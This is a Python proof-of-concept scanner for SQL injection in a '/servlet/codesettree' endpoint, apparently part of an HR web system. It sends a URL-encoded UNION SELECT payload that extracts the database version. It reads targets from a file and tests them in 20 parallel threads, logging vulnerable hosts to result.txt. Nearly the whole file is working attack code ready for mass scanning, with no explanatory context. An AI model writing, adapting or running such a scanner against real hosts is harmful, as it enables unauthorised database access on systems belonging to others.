import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    }   
def exp():
    pass
def poc(url):
    payload = '/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1'
    target = url+payload
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
    }
    try:
        rsp = requests.get(url=target,proxies=proxies,verify=False)
        if rsp.status_code == 200:
            if 'hongjing Microsoft SQL' in rsp.text:
                print(f"[+]{url}存在sql注入")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在sql注入")
        else:
            print(f"[-]{url}不存在sql注入")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()